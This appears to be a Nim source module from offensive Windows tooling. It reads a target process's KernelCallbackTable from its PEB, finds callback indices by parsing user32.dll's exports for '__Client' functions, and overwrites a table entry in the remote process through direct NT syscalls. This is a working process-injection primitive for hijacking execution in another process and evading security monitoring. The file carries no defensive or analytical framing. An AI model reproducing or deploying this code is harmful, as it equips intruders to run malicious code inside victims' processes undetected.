import winim, strutils, ..\syscalls

proc read_kct*(hProcess: HANDLE): pointer =
    var pbi: PROCESS_BASIC_INFORMATION
    var retLen: ULONG
    let status = NtQueryInformationProcess(hProcess, 0, addr pbi, sizeof(pbi).ULONG, addr retLen)
    if status != 0: return nil
    
    var kct: pointer
    var bytesRead: SIZE_T
    let readStatus = NtReadVirtualMemory(hProcess, cast[pointer](cast[uint64](pbi.PebBaseAddress) + 0x58), addr kct, sizeof(pointer).SIZE_T, addr bytesRead)
    if readStatus != 0: return nil
    return kct

proc patch_kct*(hProcess: HANDLE, index: int, newFunc: pointer, oldFunc: ptr pointer, cachedKct: pointer = nil): bool =
    let kct = if cachedKct != nil: cachedKct else: read_kct(hProcess)
    if kct == nil: return false
    
    let writeAddr = cast[pointer](cast[uint64](kct) + cast[uint64](index * 8))
    var protAddr = writeAddr
    var regionSize: SIZE_T = 8
    var oldProt: ULONG
    
    var bytesRead: SIZE_T
    if NtReadVirtualMemory(hProcess, writeAddr, oldFunc, 8, addr bytesRead) != 0: return false
    
    discard NtProtectVirtualMemory(hProcess, addr protAddr, addr regionSize, PAGE_READWRITE.ULONG, addr oldProt)
    var writable = newFunc
    var bytesWritten: SIZE_T
    let status = NtWriteVirtualMemory(hProcess, writeAddr, addr writable, 8, addr bytesWritten)
    discard NtProtectVirtualMemory(hProcess, addr protAddr, addr regionSize, oldProt.ULONG, addr oldProt)
        
    return status == 0

proc find_kct_index*(funcName: string): int =
    var hUser32 = GetModuleHandleA("user32.dll")
    if hUser32 == 0: hUser32 = LoadLibraryA("user32.dll")
    if hUser32 == 0: return -1
    
    let pBase = cast[uint64](hUser32)
    let pDos = cast[ptr IMAGE_DOS_HEADER](pBase)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](pBase + pDos.e_lfanew.uint64)
    let exportDirRva = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    if exportDirRva == 0: return -1
    
    let pExportDir = cast[ptr IMAGE_EXPORT_DIRECTORY](pBase + exportDirRva.uint64)
    let pNames = cast[ptr UncheckedArray[uint32]](pBase + pExportDir.AddressOfNames.uint64)
    
    var clientFuncs: seq[string] = @[]
    for i in 0..<pExportDir.NumberOfNames.int:
        let sName = $(cast[cstring](pBase + pNames[i].uint64))
        if sName.startsWith("__Client"):
            clientFuncs.add(sName)
    
    for i, name in clientFuncs:
        if name == funcName: return i
    return -1
